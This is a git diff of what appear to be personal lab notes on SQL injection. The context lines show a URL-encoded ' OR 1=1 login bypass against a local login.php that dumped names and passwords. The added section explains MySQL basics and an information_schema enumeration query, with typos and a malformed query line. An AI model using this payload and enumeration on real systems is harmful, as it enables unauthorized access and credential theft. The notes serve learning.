@@ -38,6 +38,23 @@ ex: username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
 http://127.0.0.1:1111/login.php/?username=%27+OR+1%3D%271&passwd=%27+OR+1%3D%271
 #This revealed an Array with a list of names and passwords
 ```
+### DB Interactions DEMO: SQL Commands
+```bash
+mysql #drops you into sql server
+### Golden Statement
+select table_schema,table_name,column_name from information_schema.colums
+  <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>
+#The comma seperated values are names of columns, before the "." is the name of database, after is the name of table.
+#SQL is hiaerachel, that goes DATABASE > TABLE > COLUMN
+#In this example the database is named INFORMATION_SCHEMA
+#the table is COLUMNS
+#The columns are TABLE_SCHEMA, TABLE_NAME, COLUMN NAME
+#lets view it
+use information_schema ;
+show tables ;
+show columns from columns ;
+#I want to show the table columns and view info from columns
+Table schema is name of database , when selecting table name, we are getting all table names, when selecting column name, we are getting the names of all the columns.
 
 
 
